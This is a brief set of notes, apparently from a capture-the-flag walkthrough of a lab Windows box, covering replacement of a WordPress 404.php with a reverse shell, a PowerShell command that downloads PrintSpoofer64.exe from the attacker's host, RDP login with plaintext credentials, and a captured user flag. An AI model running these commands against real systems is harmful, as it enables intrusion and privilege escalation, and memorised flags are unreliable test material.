
change the 404-php file with one which can execute in windows too and  listen
and
`curl http://10.10.23.86/retro/index.php/2019/12/09/tron-arcade-cabine/`

got the shell 

![[Pasted image 20210529182231.png]]


powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.17.4.208/PrintSpoofer64.exe','C:\windows\temp\PrintSpoofer64.exe')

this drops a low level shell 


----- 

with the creds we can rdp into the box 

`xfreerdp /u:wade /p:parzival /v:10.10.23.86:3389 `

![[Pasted image 20210529183651.png]]

user == 3b99fbdc6d430bfb51c72c651a261927

